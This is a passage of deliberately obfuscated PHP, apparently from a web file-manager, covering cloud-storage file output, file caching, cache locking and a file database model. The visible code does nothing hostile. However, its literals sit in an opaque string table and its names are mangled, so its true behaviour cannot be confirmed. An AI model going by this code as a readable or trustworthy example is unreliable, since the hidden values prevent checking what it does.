get_file_mime(get_path_ext($«¬Ğ°½Ì)); if ($²ú‘†°¾ == $²­‰”é[258]) { return parent::fileOut($¹Ì—Ä¦Ê, $¤Å½¹Ã, $«¬Ğ°½Ì, $›ŸŒÑê); } $¤Å½¹Ã = $¤Å½¹Ã ? $²­‰”é[1474] : $²­‰”é[1475]; $Õ·ÎçÜ = array(OSS\OssClient::OSS_SUB_RESOURCE => $²­‰”é[1476] . rawurlencode("{$¤Å½¹Ã}\x3b\x66\x69\x6c\145\x6e\x61\155\x65\75{$«¬Ğ°½Ì}")); $Õ·ÎçÜ[OSS\OssClient::OSS_SUB_RESOURCE] .= $²­‰”é[1477] . rawurlencode($²ú‘†°¾); $¾è±†ë½ = $this->link($¹Ì—Ä¦Ê, $Õ·ÎçÜ); $this->fileOutLink($¾è±†ë½); } public function fileOutServer($ÒçÑ“ôÖ, $°ô›ÑÏ† = false, $ÒñÈÄø» = false, $à¬ØÃ“ó = '') { parent::fileOut($ÒçÑ“ôÖ, $°ô›ÑÏ†, $ÒñÈÄø», $à¬ØÃ“ó); } public function fileOutImage($ŸÏ½˜—ï, $®º·œ·‚ = 250) { if ($this->size($ŸÏ½˜—ï) > 1024 * 1024 * 20) { return $this->fileOutImageServer($ŸÏ½˜—ï, $®º·œ·‚); } $ßšãëªÓ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[è¶³ÒßÑ][1436] . $®º·œ·‚); $‡Ü‰®¹ = $this->link($ŸÏ½˜—ï, $ßšãëªÓ); $this->fileOutLink($‡Ü‰®¹); } public function fileOutImageServer($İ¡¾Å‰Ù, $ó‡Š—² = 250) { parent::fileOutImage($İ¡¾Å‰Ù, $ó‡Š—²); } public function fileOutLink($ô§Êà¥ˆ) { $‚Ä‚Úòù =& $_SERVER[è¶³ÒßÑ]; if (!$this->isCdnHost() && substr($ô§Êà¥ˆ, 0, 7) == $‚Ä‚Úòù[1385]) { $ô§Êà¥ˆ = $‚Ä‚Úòù[1386] . substr($ô§Êà¥ˆ, 7); } header($‚Ä‚Úòù[185] . $ô§Êà¥ˆ); die; } public function hashMd5($¢ô¡†²•, $¢ªÂ­‚ = '') { $¶³¹Öğü =& $_SERVER[è¶³ÒßÑ]; $Ë¦ÍÂ¦ = $this->_objectMeta($¢ô¡†²•); if (!$Ë¦ÍÂ¦) { return $¶³¹Öğü[12]; } if (!isset($Ë¦ÍÂ¦[$¶³¹Öğü[1456]]) && !empty($¢ªÂ­‚)) { $˜»®¼ó = $this->updateObjMeta($¢ô¡†²•, array($¶³¹Öğü[1456] => $¢ªÂ­‚)); $Ë¦ÍÂ¦[$¶³¹Öğü[1456]] = $˜»®¼ó ? $¢ªÂ­‚ : $¶³¹Öğü[12]; } return isset($Ë¦ÍÂ¦[$¶³¹Öğü[1456]]) ? strtolower($Ë¦ÍÂ¦[$¶³¹Öğü[1456]]) : $¶³¹Öğü[12]; } public function size($¸Õú†¾‹) { $š¬É¸æ = $this->objectMeta($¸Õú†¾‹); return $š¬É¸æ ? $š¬É¸æ[$_SERVER[è¶³ÒßÑ][89]] : 0; } public function info($ç „¿Ï) { if ($this->isFolder($ç „¿Ï)) { return $this->folderInfo($ç „¿Ï); } else { if ($this->isFile($ç „¿Ï)) { return $this->fileInfo($ç „¿Ï); } } return !1; } public function exist($¬Õ­Û¢) { return $this->isFile($¬Õ­Û¢) || $this->isFolder($¬Õ­Û¢); } public function isFile($¯îû‘¶±) { return !$this->isFolder($¯îû‘¶±) && $this->objectMeta($¯îû‘¶±); } public function isFolder($°âš‰™Ô) { return $this->cacheMethod($_SERVER[è¶³ÒßÑ][189], $°âš‰™Ô); } protected function objectMeta($â¾»ô©à) { return $this->cacheMethod($_SERVER[è¶³ÒßÑ][191], $â¾»ô©à); } protected function _objectMeta($÷‚¿›ë‘) { $ŠûüÎÑç =& $_SERVER[è¶³ÒßÑ]; try { $ÎÒÉ½ƒÙ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($÷‚¿›ë‘)); } catch (OSS\Core\OssException $¹ã½ö») { $this->writeLog(__FUNCTION__ . $ŠûüÎÑç[224] . $¹ã½ö»->getMessage()); $ÎÒÉ½ƒÙ = !1; } if ($ÎÒÉ½ƒÙ) { $ÎÒÉ½ƒÙ[$ŠûüÎÑç[89]] = intval($ÎÒÉ½ƒÙ[$ŠûüÎÑç[1454]]); } return $ÎÒÉ½ƒÙ; } protected function _isFolder($Ùù¤ÊÀ) { $İí¸İòÕ =& $_SERVER[è¶³ÒßÑ]; if ($Ùù¤ÊÀ == $İí¸İòÕ[12] || $Ùù¤ÊÀ == $İí¸İòÕ[8]) { return !0; } $•´…†® = array($İí¸İòÕ[1449] => $İí¸İòÕ[8], $İí¸İòÕ[1450] => rtrim($Ùù¤ÊÀ, $İí¸İòÕ[8]) . $İí¸İòÕ[8], $İí¸İòÕ[1451] => 1, $İí¸İòÕ[1452] => $İí¸İòÕ[12]); $ĞûĞñ“à = $this->client->listObjects($this->bucket, $•´…†®); if ($ĞûĞñ“à->getObjectList() || $ĞûĞñ“à->getPrefixList()) { return !0; } return !1; } public function writeLog($ã“ş–½ = '', $§–«ö°¹ = false) { $Ãé»ú =& $_SERVER[è¶³ÒßÑ]; $Ã£—àÕ¿ = in_array(ACTION, array($Ãé»ú[222], $Ãé»ú[223])); if (!$Ã£—àÕ¿ && !GLOBAL_DEBUG) { return; } $ó¦îÒ»À = 0; if (stripos($ã“ş–½, $Ãé»ú[1478]) !== !1) { $ó¦îÒ»À = 1; $±ÌƒöÄÆ = explode($Ãé»ú[1479], $ã“ş–½); $ã“ş–½ = !empty($±ÌƒöÄÆ[1]) ? $±ÌƒöÄÆ[1] : $ã“ş–½; } else { if (stripos($ã“ş–½, $Ãé»ú[1480])) { $ó¦îÒ»À = 2; $±ÌƒöÄÆ = explode($Ãé»ú[1480], $ã“ş–½); $±ÌƒöÄÆ = explode($Ãé»ú[4], $±ÌƒöÄÆ[0]); $ã“ş–½ = !empty($±ÌƒöÄÆ[1]) ? $±ÌƒöÄÆ[1] : $ã“ş–½; } } if ($Ã£—àÕ¿ && I18n::getType() == $Ãé»ú[1481]) { if ($ó¦îÒ»À == 1) { $ã“ş–½ = str_replace($Ãé»ú[1482], $Ãé»ú[1483], $ã“ş–½); } else { if ($ó¦îÒ»À == 2) { $±ÌƒöÄÆ = explode($Ãé»ú[224], $±ÌƒöÄÆ[0]); $Ô®¡²¹ = isset($±ÌƒöÄÆ[1]) ? $±ÌƒöÄÆ[1] : $Ãé»ú[12]; $óéÜÎ‰³ = array($Ãé»ú[1484] => $Ãé»ú[1485], $Ãé»ú[1486] => $Ãé»ú[1487], $Ãé»ú[1488] => $Ãé»ú[1489], $Ãé»ú[1490] => $Ãé»ú[1491], $Ãé»ú[1492] => $Ãé»ú[1493], $Ãé»ú[1494] => $Ãé»ú[1495], $Ãé»ú[1496] => $Ãé»ú[1497], $Ãé»ú[1498] => $Ãé»ú[1499], $Ãé»ú[1500] => $Ãé»ú[1501], $Ãé»ú[1502] => $Ãé»ú[1503]); if (isset($óéÜÎ‰³[$Ô®¡²¹])) { $ã“ş–½ = $óéÜÎ‰³[$Ô®¡²¹]; } } } if (stripos($ã“ş–½, $Ãé»ú[1504])) { $ã“ş–½ = $Ãé»ú[1505]; } } if (!trim($ã“ş–½)) { return; } parent::writeLog(trim($ã“ş–½), $§–«ö°¹); } } goto aƒèÙğ²ÔÒ; e»ã•òß…–: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($š÷ßÈşÙ, $êôÕÀë™) { $ë¢ºæÛÃ =& $_SERVER[è¶³ÒßÑ]; $this->cachePath = $š÷ßÈşÙ[$ë¢ºæÛÃ[97]]; $this->prefix = $ë¢ºæÛÃ[888]; $this->cacheTime = $êôÕÀë™; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($‡ºÛ³æ³) { $Î¡ì½ÌÊ =& $_SERVER[è¶³ÒßÑ]; $‡ºÛ³æ³ = str_replace(array($Î¡ì½ÌÊ[889], $Î¡ì½ÌÊ[110], $Î¡ì½ÌÊ[86]), $Î¡ì½ÌÊ[890], $‡ºÛ³æ³); return $this->cachePath . $Î¡ì½ÌÊ[891] . $‡ºÛ³æ³ . $Î¡ì½ÌÊ[892]; } public function set($½ıŒ¬¼–, $Æ¬äØ¬š, $òûáöø² = false) { $òûáöø² = $òûáöø² ? $òûáöø² : $this->cacheTime; $ÑÌò¶´• = $this->getFile($½ıŒ¬¼–); if (file_put_contents($ÑÌò¶´•, $this->prefix . $Æ¬äØ¬š, LOCK_EX)) { @touch($ÑÌò¶´•, intval(time() + $òûáöø²)); clearstatcache(); return !0; } @unlink($ÑÌò¶´•); return !1; } public function get($¹ïÉïè) { $´éùØõƒ = $this->getFile($¹ïÉïè); if (file_exists($´éùØõƒ) && filemtime($´éùØõƒ) < time()) { @unlink($´éùØõƒ); return !1; } $¨’†«š§ = @file_get_contents($´éùØõƒ); return substr($¨’†«š§, strlen($this->prefix)); } public function remove($ƒ¡¨Ë£à) { $ƒ³ÕÉîå = $this->getFile($ƒ¡¨Ë£à); return @unlink($ƒ³ÕÉîå); } public function deleteAll() { $€›§š¨ù =& $_SERVER[è¶³ÒßÑ]; $À¥ıÊÄİ = scandir($this->cachePath); foreach ($À¥ıÊÄİ as $ÅÜÊâÒ¹) { $’Ìé‚º° = $this->cachePath . $ÅÜÊâÒ¹; if (strpos($’Ìé‚º°, $€›§š¨ù[892]) && strpos($’Ìé‚º°, $€›§š¨ù[893])) { @unlink($’Ìé‚º°); } } } public function clearTimeout() { $èª´ÃÒ© =& $_SERVER[è¶³ÒßÑ]; $ÂÈÕíŞ© = scandir($this->cachePath); foreach ($ÂÈÕíŞ© as $òº¾ÊĞ¯) { $•÷¨¡  = $this->cachePath . $òº¾ÊĞ¯; if (strpos($•÷¨¡ , $èª´ÃÒ©[892]) && strpos($•÷¨¡ , $èª´ÃÒ©[893]) && filemtime($•÷¨¡ ) < time()) { @unlink($•÷¨¡ ); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $ÊÍ‰Ğèï =& $_SERVER[è¶³ÒßÑ]; if (self::$handle) { return self::$handle; } $çÄñŒÁ© = $GLOBALS[$ÊÍ‰Ğèï[6]][$ÊÍ‰Ğèï[418]]; self::$timeout = $çÄñŒÁ©[$ÊÍ‰Ğèï[894]] ? $çÄñŒÁ©[$ÊÍ‰Ğèï[894]] : 10; $½“Ü¦¾ú = _get($GLOBALS[$ÊÍ‰Ğèï[6]], $ÊÍ‰Ğèï[895]); $ÙÉÑ€ˆ = $çÄñŒÁ©[$ÊÍ‰Ğèï[880]] ? $çÄñŒÁ©[$ÊÍ‰Ğèï[880]] : $ÊÍ‰Ğèï[240]; if ($ÙÉÑ€ˆ == $ÊÍ‰Ğèï[21] && $½“Ü¦¾ú == $ÊÍ‰Ğèï[13]) { $ÙÉÑ€ˆ = $ÊÍ‰Ğèï[240]; } switch ($ÙÉÑ€ˆ) { case $ÊÍ‰Ğèï[883]: self::$handle = new CacheLockRedis(); break; case $ÊÍ‰Ğèï[884]: self::$handle = new CacheLockMemcached(); break; case $ÊÍ‰Ğèï[21]: self::$handle = new CacheLockDatabase(); break; case $ÊÍ‰Ğèï[240]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($ÊÍ‰Ğèï[896], $ÊÍ‰Ğèï[897]); } return self::$handle; } private static function key($ùäáª¶à) { return $_SERVER[è¶³ÒßÑ][898] . Cache::key($ùäáª¶à); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($÷Šğ»ƒİ = '') { self::$errorMsg = $÷Šğ»ƒİ; } public static function lockGlobal($É•æõ±, $éóÚ•…¹) { return self::lock($É•æõ±, $éóÚ•…¹, !0); } public static function lock($æ…§¹óº, $ÕÆİğæû = false, $ÄúÑ½–å = false) { $“¾¨¼¥º =& $_SERVER[è¶³ÒßÑ]; $ÇßÄÖã = self::init(); $õÎÇÆ› = self::key($æ…§¹óº); $ÕÆİğæû = $ÕÆİğæû ? $ÕÆİğæû : self::$timeout; $³Î¤Ÿ¸¶ = timeFloat(); $ÏªÖ°è– = $ÇßÄÖã->lock($õÎÇÆ›, $ÕÆİğæû); $ô÷Çƒ«¸ = timeFloat(); if (!$ÏªÖ°è–) { $¢ã²î“¢ = "\154\x6f\143\153\40\145\x72\162\x6f\x72\73\153\x65\x79\75{$æ…§¹óº}\73\164\x69\x6d\145\x3d{$ÕÆİğæû}\x3b" . self::$errorMsg . $“¾¨¼¥º[84] . get_caller_msg(); $œ–×òÂğ = LNG($“¾¨¼¥º[899]) . "\50{$ÕÆİğæû}\163\x29\56" . LNG($“¾¨¼¥º[900]); $œ–×òÂğ .= $“¾¨¼¥º[901]; if (is_string(self::$errorMsg) && self::$errorMsg) { $œ–×òÂğ = $œ–×òÂğ . $“¾¨¼¥º[902] . self::$errorMsg; } write_log($“¾¨¼¥º[903] . sprintf($“¾¨¼¥º[904], timeFloat() - $³Î¤Ÿ¸¶) . $“¾¨¼¥º[905] . $¢ã²î“¢ . $“¾¨¼¥º[906] . error_get_last(), $“¾¨¼¥º[897]); show_json($œ–×òÂğ, !1); } if (!$ÄúÑ½–å) { self::$lockItem[$õÎÇÆ›] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $ı¹¦å½Š = number_format(timeFloat() - $ô÷Çƒ«¸, 3); write_log($“¾¨¼¥º[907] . $æ…§¹óº . $“¾¨¼¥º[908] . $ı¹¦å½Š, $“¾¨¼¥º[897]); } return $ÏªÖ°è–; } public static function lockGet($Ò„œâÎï) { $æš•‘ = self::key($Ò„œâÎï); if (self::$lockItem[$æš•‘]) { return self::$lockItem[$æš•‘]; } return self::init()->lockGet($æš•‘); } public static function unlock($Â¼ü˜À£) { $ÂÎĞş·‘ =& $_SERVER[è¶³ÒßÑ]; $Â­Âúæ„ = self::key($Â¼ü˜À£); self::$lockItem[$Â­Âúæ„] = null; self::init()->unlock($Â­Âúæ„); if (GLOBAL_DEBUG_LOG_ALL) { write_log($ÂÎĞş·‘[909] . $Â¼ü˜À£, $ÂÎĞş·‘[897]); } return; } public static function unlockRuntime() { $äÇÓŞ¿» =& $_SERVER[è¶³ÒßÑ]; $ƒäûÀØ¥ = self::init(); $ø•ÏıÄ¼ = !1; foreach (self::$lockItem as $öß‰™ƒ => $«Ú¥Û) { if (!$«Ú¥Û) { continue; } $ƒäûÀØ¥->unlock($öß‰™ƒ); if (!$ø•ÏıÄ¼) { $ø•ÏıÄ¼ = !0; write_log($äÇÓŞ¿»[910] . $öß‰™ƒ . $äÇÓŞ¿»[84] . get_caller_msg(), $äÇÓŞ¿»[897]); continue; } write_log($äÇÓŞ¿»[910] . $öß‰™ƒ, $äÇÓŞ¿»[897]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $Õœàö˜» = number_format(timeFloat() - TIME_FLOAT, 3); write_log($äÇÓŞ¿»[911] . $Õœàö˜» . $äÇÓŞ¿»[912] . ACTION, $äÇÓŞ¿»[897]); } } public static function fileLock($—±ËĞçì) { $ğÊÆ÷ò¯ =& $_SERVER[è¶³ÒßÑ]; if (!$GLOBALS[$ğÊÆ÷ò¯[913]]) { $GLOBALS[$ğÊÆ÷ò¯[913]] = array(); } $GLOBALS[$ğÊÆ÷ò¯[913]][$—±ËĞçì] = !1; $Î¹’³ê© = fopen(DATA_PATH . $—±ËĞçì . $ğÊÆ÷ò¯[914], $ğÊÆ÷ò¯[915]); if (!$Î¹’³ê©) { return !1; } $GLOBALS[$ğÊÆ÷ò¯[913]][$—±ËĞçì] = $Î¹’³ê©; if (flock($Î¹’³ê©, LOCK_EX)) { return !0; } self::unlock($—±ËĞçì); show_json($ğÊÆ÷ò¯[916], !1); return !1; } public static function fileUnlock($„ïØ¡¸) { $ÀÖ†Áá =& $_SERVER[è¶³ÒßÑ]; $‡„°Öµš = $GLOBALS[$ÀÖ†Áá[913]][$„ïØ¡¸]; if (!$‡„°Öµš) { return; } $GLOBALS[$ÀÖ†Áá[913]][$„ïØ¡¸] = !1; flock($‡„°Öµš, LOCK_UN); fclose($‡„°Öµš); } public static function fileUnlockAll() { $şô´˜õ« =& $_SERVER[è¶³ÒßÑ]; if (!isset($GLOBALS[$şô´˜õ«[913]]) || !$GLOBALS[$şô´˜õ«[913]]) { return; } foreach ($GLOBALS[$şô´˜õ«[913]] as $£§¹± ¬ => $½Ó·İÖ’) { if (!$½Ó·İÖ’) { continue; } $GLOBALS[$şô´˜õ«[913]][$£§¹± ¬] = !1; flock($½Ó·İÖ’, LOCK_UN); fclose($½Ó·İÖ’); } $GLOBALS[$şô´˜õ«[913]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } goto E´Ğí’¿Ò; dšø—Ì…‹¡: define($_SERVER[è¶³ÒßÑ][311], 1); define($_SERVER[è¶³ÒßÑ][312], 0); define($_SERVER[è¶³ÒßÑ][313], 2); goto eÇ¯·“‘Â; f¼•ğÛ‰ğ: class FileModel extends ModelBase { protected $tableName = "\x69\157\137\x66\x69\154\145"; protected $tableMeta = array("\164\x61\142\x6c\145\x4e\x61\x6d\x65" => "\151\157\x5f\x66\x69\x6c\x65\x5f\155\145\x74\x61", "\155\x65\x74\x61\106\151\145\x6c\x64" => "\x66\151\154\x65\x49\x44"); public function fileInfo($Ó¥ı´îÇ) { $™»æÔà× =& $_SERVER[è¶³ÒßÑ]; static $€ƒ‘Â… = array(); if (!isset($€ƒ‘Â…[$Ó¥ı´îÇ])) { $ê†±¼ä¾ = $™»æÔà×[2009]; $Ğ¾Ùçıî = Model($™»æÔà×[537])->field($ê†±¼ä¾)->where(array($™»æÔà×[535] => $Ó¥ı´îÇ))->find(); $€ƒ‘Â…[$Ó¥ı´îÇ] = $Ğ¾Ùçıî; } return $€ƒ‘Â…[$Ó¥ı´îÇ]; } public function addFileByContent($øÍ¦œ´Î = '', $îûÅ›©Ë = '') { $ÏüæÉŒ =& $_SERVER[è¶³ÒßÑ]; $ã‡Ã²¡ø = TEMP_PATH . $ÏüæÉŒ[2010]; if (!is_dir($ã‡Ã²¡ø)) { mk_dir($ã‡Ã²¡ø); } $¥¶‘´Îş = $ã‡Ã²¡ø . $ÏüæÉŒ[2011] . rand_string(16); file_put_contents($¥¶‘´Îş, $øÍ¦œ´Î); $Ôª¼Ñ±Å = $this->addFile($¥¶‘´Îş, $îûÅ›©Ë, !0); if (file_exists($¥¶‘´Îş)) { @unlink($¥¶‘´Îş); } return $Ôª¼Ñ±Å; } public function createFileName($€ßğ¡ÄŒ, $û´‰¶ÍÕ = false, $ŒÖ†‘· = false) { $ã‡„‰†• =& $_SERVER[è¶³ÒßÑ]; $öÆü€œÖ = IO::init($ã‡„‰†•[8]); $±ã´— = $this->makeFilePath($€ßğ¡ÄŒ, $öÆü€œÖ, $û´‰¶ÍÕ, $ŒÖ†‘·); $´ŞÕßƒ = $öÆü€œÖ->pathFather($±ã´—); static $Ùñç´ğ© = false; $·áÏÎ¼¶ = $ã‡„‰†•[2012] . md5($´ŞÕßƒ); if (!$Ùñç´ğ© && !Cache::get($·áÏÎ¼¶)) { $Ùñç´ğ© = !0; $ÕßšÂÒ† = IO::mkdir($´ŞÕßƒ); if (!IO::exist($ÕßšÂÒ† . $ã‡„‰†•[851])) { IO::mkfile($ÕßšÂÒ† . $ã‡„‰†•[851]); } Cache::set($·áÏÎ¼¶, 1, 3600 * 2); } return $±ã´—; } public function makeFilePath($İ®üÂÙµ, $”³§ĞÊ, $¦¾ò äì = false, $ƒïª¸×ñ = false) { $æøÖØÎò =& $_SERVER[è¶³ÒßÑ]; $˜ì¹Ì¤ = Model($æøÖØÎò[824])->get($æøÖØÎò[2013]); $Ùå¹Ÿ”± = KodIO::defaultIO() . date($æøÖØÎò[2014]); $‰²‹š”» = $Ùå¹Ÿ”± . rand_string(5) . short_id(100); $İ®üÂÙµ = str_replace($æøÖØÎò[8], $æøÖØÎò[11], KodIO::clear($İ®üÂÙµ)); $–Áİ™¡á = $”³§ĞÊ->ext($İ®üÂÙµ); if (!$İ®üÂÙµ) { $˜ì¹Ì¤ = $æøÖØÎò[830]; } switch ($˜ì¹Ì¤) { case $æøÖØÎò[2015]: if ($–Áİ™¡á) { $‰²‹š”» = $‰²‹š”» . $æøÖØÎò[10] . $–Áİ™¡á; } if ($–Áİ™¡á == $æøÖØÎò[1952]) { $‰²‹š”» .= $æøÖØÎò[1266]; } break; case $æøÖØÎò[2016]: $†ÇÉøè” = Model($æøÖØÎò[824])->get($æøÖØÎò[825]); $ÌÖãä–œ = substr(md5($æøÖØÎò[826] . $†ÇÉøè” . date($æøÖØÎò[803])), 0, 8); $œ†„§¿ = KodIO::defaultDriver(); $Ùå¹Ÿ”± = $æøÖØÎò[1297] . $œ†„§¿[$æøÖØÎò[468]] . $æøÖØÎò[477] . date($æøÖØÎò[2017]) . $ÌÖãä–œ . $æøÖØÎò[8]; if ($–Áİ™¡á == $æøÖØÎò[1952]) { $İ®üÂÙµ .= $æøÖØÎò[1266]; } $¿¦¾‹ˆ = $æøÖØÎò[2018] . $Ùå¹Ÿ”± . $İ®üÂÙµ; CacheLock::lock($¿¦¾‹ˆ); $‰²‹š”» = $Ùå¹Ÿ”± . $İ®üÂÙµ; if (IO::exist($Ùå¹Ÿ”± . $İ®üÂÙµ)) { $¹¿©öÂÚ = substr($İ®üÂÙµ, 0, strlen($İ®üÂÙµ) - strlen($–Áİ™¡á)); $“øÏ¥¨  = $ƒïª¸×ñ ? substr($ƒïª¸×ñ, 0, 5) : ($¦¾ò äì ? substr($¦¾ò äì, 0, 5) : rand_string(5)); $‰²‹š”» = $Ùå¹Ÿ”± . $¹¿©öÂÚ . $“øÏ¥¨ ; if ($–Áİ™¡á) { $‰²‹š”» = $‰²‹š”» . $æøÖØÎò[10] . $–Áİ™¡á; } } if (IO::isOsDriver($‰²‹š”») && !IO::isUploadServer($‰²‹š”»)) { if (IO::exist($‰²‹š”»)) { return $‰²‹š”»; } $ÃÒß«† = IO::setContent($‰²‹š”», $æøÖØÎò[12]); if (!$ÃÒß«†) { show_json($æøÖØÎò[2019], !1); } } CacheLock::unlock($¿¦¾‹ˆ); break; case $æøÖØÎò[830]: break; default: break; } return $‰²‹š”»; } public function addFileByRemote($‘´ıÆıµ, $¥Ñ¦†˜ı, $‰âÛÓíá = array()) { $ãıÏ›¶– =& $_SERVER[è¶³ÒßÑ]; if (!IO::exist($‘´ıÆıµ)) { return !1; } $Ş¤¶àŞ = $‰âÛÓíá[$ãıÏ›¶–[540]] ? $‰âÛÓíá[$ãıÏ›¶–[540]] : $ãıÏ›¶–[12]; $½­Ç’š = IO::hashMd5($‘´ıÆıµ, $Ş¤¶àŞ); $ˆ–ï½ = KodIO::defaultDriver(); $çİùåÏÍ = array($ãıÏ›¶–[610] => IO::size($‘´ıÆıµ), $ãıÏ›¶–[2020] => 1, $ãıÏ›¶–[487] => $¥Ñ¦†˜ı, $ãıÏ›¶–[862] => $ˆ–ï½[$ãıÏ›¶–[468]], $ãıÏ›¶–[488] => $‘´ıÆıµ, $ãıÏ›¶–[2021] => $‰âÛÓíá[$ãıÏ›¶–[665]] ? $‰âÛÓíá[$ãıÏ›¶–[665]] : IO::hashSimple($‘´ıÆıµ), $ãıÏ›¶–[2022] => $½­Ç’š ? $½­Ç’š : $Ş¤¶àŞ); if ($ë‚÷Š¸ì = $this->addFileCheckExist($çİùåÏÍ[$ãıÏ›¶–[665]], $çİùåÏÍ[$ãıÏ›¶–[540]], $çİùåÏÍ[$ãıÏ›¶–[89]])) { return $ë‚÷Š¸ì; } return $this->addFileData($çİùåÏÍ); } private function addFileData($ß´ˆÜ×ø) { $®«ÍÕàŠ =& $_SERVER[è¶³ÒßÑ]; if (!$ß´ˆÜ×ø) { return !1; } $ß´ˆÜ×ø[$®«ÍÕàŠ[89]] = intval($ß´ˆÜ×ø[$®«ÍÕàŠ[89]]); if (!$ß´ˆÜ×ø[$®«ÍÕàŠ[89]] && strlen($ß´ˆÜ×ø[$®«ÍÕàŠ[665]]) > 32) { $ß´ˆÜ×ø[$®«ÍÕàŠ[89]] = intval(substr($ß´ˆÜ×ø[$®«ÍÕàŠ[665]], 32)); } $¿‘¼ƒˆ‰ = $this->add($ß´ˆÜ×ø); return $this->find($¿‘¼ƒˆ‰); } public function addFile($ä­Õ¸â, $ì›ä‘¸Ë, $¸üƒÀ… = false) { $é¾òŒ˜ =& $_SERVER[è¶³ÒßÑ]; $œâùÙª = IO::hashSimple($ä­Õ¸â); $³¼ñ‚ü = IO::size($ä­Õ¸â); $ó”‹ç¾ş = $³¼ñ‚ü <= 1024 * 1024 * 10 ? IO::hashMd5($ä­Õ¸â) : $é¾òŒ˜[12]; $™ü ¦›Ÿ = $é¾òŒ˜[2023] . $œâùÙª; CacheLock::lock($™ü ¦›Ÿ); if ($ó”‹ç¾ş && $œâùÙª) { $È©ê®Î± = $this->addFileCheckExist($œâùÙª, $ó”‹ç¾ş, $³¼ñ‚ü); if ($È©ê®Î±) { CacheLock::unlock($™ü ¦›Ÿ); return $È©ê®Î±; } } $²Óø»ÂÂ = $this->addFileMake($ä­Õ¸â, $³¼ñ‚ü, $œâùÙª, $ó”‹ç¾ş, $ì›ä‘¸Ë, $¸üƒÀ…); $„¨Å‰¼ = $this->addFileData($²Óø»ÂÂ); CacheLock::unlock($™ü ¦›Ÿ); if (!$ó”‹ç¾ş && $„¨Å‰¼) { $this->fileMd5Check($„¨Å‰¼); } return $„¨Å‰¼; } public function fileMd5Check($Å‹È¡ğ¥) { $·à®†Ù‰ =& $_SERVER[è¶³ÒßÑ]; $±È´€ÍÄ = array($Å‹È¡ğ¥[$·à®†Ù‰[534]], $Å‹È¡ğ¥[$·à®†Ù‰[97]]); $¾Ã¶˜Ï = $·à®†Ù‰[2024] . $Å‹È¡ğ¥[$·à®†Ù‰[97]]; $âË®È¬… = $·à®†Ù‰[2025] . $Å‹È¡ğ¥[$·à®†Ù‰[534]]; TaskQueue::add($·à®†Ù‰[2026], $±È´€ÍÄ, $¾Ã¶˜Ï, $âË®È¬…); } public function fileMd5Set($ÙŒ²Ï¿¹, $ÌøŠ¯©) { $¼¬Ö­•¢ =& $_SERVER[è¶³ÒßÑ]; $‹éÏıá¼ = $this->find($ÙŒ²Ï¿¹); if (!$‹éÏıá¼ || $‹éÏıá¼[$¼¬Ö­•¢[540]]) { return; } $„÷×Ë” = IO::hashMd5($ÌøŠ¯©); if (!$„÷×Ë”) { return $¼¬Ö­•¢[12]; } $this->where(array($¼¬Ö­•¢[534] => $ÙŒ²Ï¿¹))->save(array($¼¬Ö­•¢[540] => $„÷×Ë”)); } public function addFileMake($ù”÷‹‹Æ, $™½«÷¼, $Î‹÷¥Ÿ, $Ö‹áí´º, $·³Ö‰ÙÜ, $Ë×™¿‘¼) { $ÚÏß¶ =& $_SERVER[è¶³ÒßÑ]; $å¯Ãê±¶ = $this->createFileName($·³Ö‰ÙÜ, $Î‹÷¥Ÿ, $Ö‹áí´º); $¾æ–Ş›¡ = get_path_father($å¯Ãê±¶); $ÉÇ¡Ûç = get_path_this($å¯Ãê±¶); if ($Ë×™¿‘¼) { $õ“ÌİÉô = IO::move($ù”÷‹‹Æ, $¾æ–Ş›¡, !1, $ÉÇ¡Ûç); } else { $õ“ÌİÉô = IO::copy($ù”÷‹‹Æ, $¾æ–Ş›¡, !1, $ÉÇ¡Ûç); } if (!$õ“ÌİÉô) { return !1; } $—´Ášƒä = KodIO::defaultDriver(); $¬õ¬½°Š = array($ÚÏß¶[610] => $™½«÷¼, $ÚÏß¶[2020] => 1, $ÚÏß¶[487] => $·³Ö‰ÙÜ, $ÚÏß¶[862] => $—´Ášƒä[$ÚÏß¶[468]], $ÚÏß¶[488] => $å¯Ãê±¶, $ÚÏß¶[2021] => $Î‹÷¥Ÿ, $ÚÏß¶[2022] => $Ö‹áí´º); return $¬õ¬½°Š; } public function addFileCheckExist($¨§‹«¡, $•òÉ’¾š, $¸õÛı„) { $óàµ—ıÒ =& $_SERVER[è¶³ÒßÑ]; $É„ôƒæ× = $this->findByHash($¨§‹«¡, $•òÉ’¾š); if (!$É„ôƒæ×) { return !1; } $÷ñ±©îê = array($óàµ—ıÒ[2020] => intval($É„ôƒæ×[$óàµ—ıÒ[2027]]) + 1, $óàµ—ıÒ[610] => $¸õÛı„); $this->where(array($óàµ—ıÒ[535] => $É„ôƒæ×[$óàµ—ıÒ[534]]))->save($÷ñ±©îê); return $É„ôƒæ×; } public function remove($†¥ˆş›«) { $this->linkCountChange($†¥ˆş›«, !1); $this->clearEmpty(); return !0; } public function linkAdd($ó‚ìµş¦) { $this->linkCountChange($ó‚ìµş¦, !0); } public function linkCountChange($”€Üù½, $ğ‹ÃåÁ) { $ÖøîÑ¢÷ =& $_SERVER[è¶³ÒßÑ]; if (!$”€Üù½) { return; } if (!is_array($”€Üù½)) { $”€Üù½ = array($”€Üù½); } $”ÂßÑÏ = array(); foreach ($”€Üù½ as $çÙû ñ) { $á¢¢¡ÎÇ = $çÙû ñ . $ÖøîÑ¢÷[12]; if (!$”ÂßÑÏ[$á¢¢¡ÎÇ]) { $”ÂßÑÏ[$á¢¢¡ÎÇ] = 0; } $”ÂßÑÏ[$á¢¢¡ÎÇ]++; } $˜æšÑ¹ş = array(); foreach ($”ÂßÑÏ as $çÙû ñ => $Ä°’…ş¾) { $á¢¢¡ÎÇ = $Ä°’…ş¾ . $ÖøîÑ¢÷[12]; if (!$˜æšÑ¹ş[$á¢¢¡ÎÇ]) { $˜æšÑ¹ş[$á¢¢¡ÎÇ] = array(); } 